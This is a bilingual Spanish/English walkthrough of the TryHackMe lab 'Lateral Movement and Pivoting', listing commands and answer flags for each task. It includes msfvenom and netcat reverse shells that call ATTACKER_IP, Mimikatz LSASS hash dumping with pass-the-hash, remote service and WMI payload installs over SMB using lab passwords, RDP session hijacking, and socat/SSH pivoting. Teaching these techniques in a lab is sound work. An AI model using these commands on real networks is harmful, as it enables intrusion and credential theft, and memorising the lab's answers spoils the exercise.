# Lateral Movement and Pivoting [EASY]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** EASY
* **Tipo / Type:** Network / Walkthrough (Premium)
* **Slug:** `lateralmovementandpivoting`
* **Link:** https://tryhackme.com/room/lateralmovementandpivoting
* **Sección / Section:** Network / Active Directory
* **Fuente / Source:** Writeup de Kevinovitz (GitHub) + Cajac (GitHub)

---

## Solucionario de Tareas / Task Solutions

> **ES:** Aprende sobre técnicas comunes usadas para moverse lateralmente a través de una red Windows. Cubre: Spawning Processes Remotely, Moving Laterally Using WMI, Use of Alternate Authentication Material, Abusing User Behaviour y Port Forwarding.
> **EN:** Learn about common techniques used to move laterally across a Windows network. Covers: Spawning Processes Remotely, Moving Laterally Using WMI, Use of Alternate Authentication Material, Abusing User Behaviour and Port Forwarding.

---

### Task 1 — Introduction

Configurar la conexión a la red: editar `/etc/resolve.conf` para incluir la IP del DC como servidor DNS y reiniciar el servicio de red.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Click and continue learning! | `No answer needed` |

---

### Task 2 — Moving Through the Network

El movimiento lateral es el grupo de técnicas usadas por los atacantes para moverse por una red. Es parte de un ciclo: usar credenciales disponibles para moverse lateralmente, acceder a nuevas máquinas, elevar privilegios y extraer credenciales.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| (Preguntas de lectura / reading questions) | `No answer needed` |

---

### Task 3 — Spawning Processes Remotely

Crear un reverse shell con `msfvenom` y transferirlo al servidor THMIIS vía SMB con las credenciales de Leonard Summers. Luego crear y ejecutar un servicio en THMIIS.

```
msfvenom -p windows/meterpreter/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=1337 -o letmein.exe

smbclient -c 'put letmein.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

En THMJMP2 (como Tony), usar `runas` para obtener un shell en el jump server:

```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1338"
```

Crear y arrancar el servicio en THMIIS:

```
sc.exe \\thmiis.za.tryhackme.com create service binPath= "%windir%\letmein.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start service
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag? | `THM{MOVING_WITH_SERVICES}` |

---

### Task 4 — Moving Laterally Using WMI

Crear un payload MSI y transferirlo a THMIIS con las credenciales de Corine Waters. Luego usar WMI (CIM) para instalar el MSI remotamente.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f msi > msi.msi

smbclient -c 'put msi.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```

```powershell
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\msi.msi"; Options = ""; AllUsers = $false}
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| After running the "flag.exe" file on t1_corine.waters desktop on THMIIS, what is the flag? | `THM{MOVING_WITH_WMI_4_FUN}` |

---

### Task 5 — Use of Alternate Authentication Material

Usar credenciales de alto privilegio para acceder a THMJMP2 vía SSH y volcar los hashes NTLM de LSASS con Mimikatz. Luego pass-the-hash para obtener un shell en THMIIS.

```
C:\tools\mimikatz.exe
privilege::debug
sekurlsa::msv
```

Pass-the-hash:

```
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
```

Mover a THMIIS con `winrs`:

```
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the flag obtained from executing "flag.exe" on t1_toby.beck's desktop on THMIIS? | `THM{NO_PASSWORD_NEEDED}` |

---

### Task 6 — Abusing User Behaviour

Obtener nuevas credenciales de `http://distributor.za.tryhackme.com/creds_t2` y acceder a THMJMP2. Ejecutar `PsExec64.exe -s cmd.exe` y `query session` para listar conexiones RDP activas. Secuestrar la sesión de Toby Beck con `tscon`.

```
tscon 3 /dest:rdp-tcp#47
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What flag did you get from hijacking t1_toby.beck's session on THMJMP2? | `THM{NICE_WALLPAPER}` |

---

### Task 7 — Port Forwarding

Usar `socat` en THMJMP2 para reenviar el puerto RDP de THMIIS:

```
ssh za.tryhackme.com\\tony.holland@thmjmp2.za.tryhackme.com
socat TCP4-LISTEN:1337, TCP4:THMIIS.za.tryhackme.com:3389
```

Luego RDP a THMJMP2 en el puerto 1337 para llegar a THMIIS.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the flag obtained from executing "flag.exe" on t1_thomas.moore's desktop on THMIIS? | `THM{SIGHT_BEYOND_SIGHT}` |

Para el exploit de Rejetto HFS en THMDC, configurar un túnel SSH con un puerto remoto y dos puertos locales:

```
ssh tunneluser2@ATTACKER_IP -R 1337:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N
```

Luego usar el exploit de Metasploit `rejetto_hfs_exec`.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the flag obtained using the Rejetto HFS exploit on THMDC? | `THM{FORWARDING_IT_ALL}` |

---

### Task 8 — Conclusion

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| (Preguntas de lectura / reading questions) | `No answer needed` |

---

## Metodología / Methodology

1. **Spawning Processes Remotely:** crear servicio con `sc.exe` para ejecutar un payload en un host remoto.
2. **Moving Laterally Using WMI:** usar `Invoke-CimMethod` con `Win32_Product` para instalar un MSI remotamente.
3. **Use of Alternate Authentication Material:** volcar hashes NTLM con Mimikatz y hacer pass-the-hash.
4. **Abusing User Behaviour:** secuestrar sesiones RDP activas con `tscon`.
5. **Port Forwarding:** usar `socat` y túneles SSH para pivotar a hosts inaccesibles.

**Lección:** el movimiento lateral es un ciclo de credenciales → acceso → elevación → extracción de credenciales. Herramientas útiles: Sshuttle, Rpivot, Chisel.

---

*Documentación para propósitos educativos y registro de CTF.*
